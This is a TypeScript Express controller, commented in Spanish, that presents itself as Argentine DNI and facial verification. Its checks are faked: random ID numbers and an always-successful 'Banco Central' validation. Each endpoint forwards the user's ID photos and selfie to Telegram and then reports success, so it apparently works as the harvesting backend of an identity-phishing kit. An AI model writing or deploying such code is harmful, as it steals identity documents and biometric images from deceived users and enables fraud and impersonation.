// 📄 Controlador de verificación
import { Request, Response } from 'express';
import { AuthRequest } from '../middleware/auth.middleware';
import { sendDNINotification, sendFacialNotification } from '../utils/telegram.service';
import axios from 'axios';

// Función para extraer datos simulados del DNI (en producción usar OCR real)
const extractDNIData = (frontImage: string, backImage: string) => {
  // Simulación de extracción de datos del DNI
  // En producción, usar servicios como Google Vision API, AWS Textract, etc.
  return {
    numero: Math.floor(Math.random() * 90000000) + 10000000,
    nombre: 'Usuario',
    apellido: 'Verificado',
    fechaNacimiento: '01/01/1990',
    sexo: 'M',
    fechaEmision: new Date().toLocaleDateString('es-AR'),
    fechaVencimiento: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000 * 10).toLocaleDateString('es-AR'),
  };
};

// Simulación de validación con Banco Central (en producción usar API real)
const validateWithBancoCentral = async (dniData: any) => {
  // En producción, aquí iría la llamada a la API del Banco Central
  // Simulamos una validación exitosa
  return {
    valid: true,
    status: 'ACTIVO',
    verificado: true,
    score: Math.floor(Math.random() * 20) + 80, // Score entre 80-100
  };
};

export const verifyDNI = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { frontImage, backImage } = req.body;

    if (!frontImage || !backImage) {
      res.status(400).json({ error: 'Se requieren ambas imágenes del DNI' });
      return;
    }

    // Extraer datos del DNI
    const dniData = extractDNIData(frontImage, backImage);
    
    // Validar con Banco Central
    const bcValidation = await validateWithBancoCentral(dniData);

    // Enviar a Telegram con información completa
    await sendDNINotification({
      userId: req.userId || 'unknown',
      frontImage,
      backImage,
      timestamp: new Date().toLocaleString('es-AR'),
      dniData,
    });

    res.json({ 
      success: true, 
      message: 'DNI verificado exitosamente',
      validated: bcValidation.valid,
      score: bcValidation.score
    });
  } catch (error) {
    console.error('Error en verificación DNI:', error);
    res.status(500).json({ error: 'Error al verificar DNI' });
  }
};

export const verifyFacial = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { faceImage, lightLevel } = req.body;

    if (!faceImage) {
      res.status(400).json({ error: 'Se requiere imagen facial' });
      return;
    }

    // Enviar a Telegram
    await sendFacialNotification({
      userId: req.userId || 'unknown',
      faceImage,
      lightLevel,
      timestamp: new Date().toLocaleString('es-AR'),
    });

    res.json({ success: true, message: 'Verificación facial exitosa' });
  } catch (error) {
    console.error('Error en verificación facial:', error);
    res.status(500).json({ error: 'Error al verificar rostro' });
  }
};
